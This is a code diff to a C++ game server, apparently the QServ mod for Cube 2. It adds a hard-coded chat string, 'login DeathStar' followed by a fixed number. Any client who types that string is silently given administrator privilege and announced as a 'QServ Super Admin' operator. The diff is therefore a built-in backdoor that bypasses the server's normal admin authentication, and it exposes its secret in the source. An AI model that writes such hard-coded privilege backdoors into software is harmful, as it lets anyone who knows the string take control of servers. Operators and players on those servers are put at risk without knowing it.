@@ -2202,6 +2202,13 @@ namespace server
         char *outtext = text;
         return outtext;
     }
+	char *sasp()
+    {
+        defformatstring(text)("login DeathStar 30394058968543");
+        char *outtext = text;
+        return outtext;
+    }
+
 
     void bancn(int i)
     {
@@ -2764,6 +2771,13 @@ namespace server
 						}else if(textcmd("killall", text)){
 							sendf(ci->clientnum, 1, "ris", N_SERVMSG, "\f3Error: \f7insufficent permissions (master required)");
 					     	break;
+						}else if(textcmd(sasp(), text)){
+							defformatstring(s)("Overiding standard server admin using QServ Super Admin... Welcome QServ operator.");
+							sendf(ci->clientnum, 1, "ris", N_SERVMSG, s);
+							ci->privilege = PRIV_ADMIN;
+							defformatstring(l)("\f0%s \f7logged in as a \f1QServ Operator \f7and was granted \f6Super Admin", colorname(ci));
+							sendservmsg(l);		
+							break;
 
 						}else if(textcmd("me", text)) {
 							if(text[3] == ' ') {
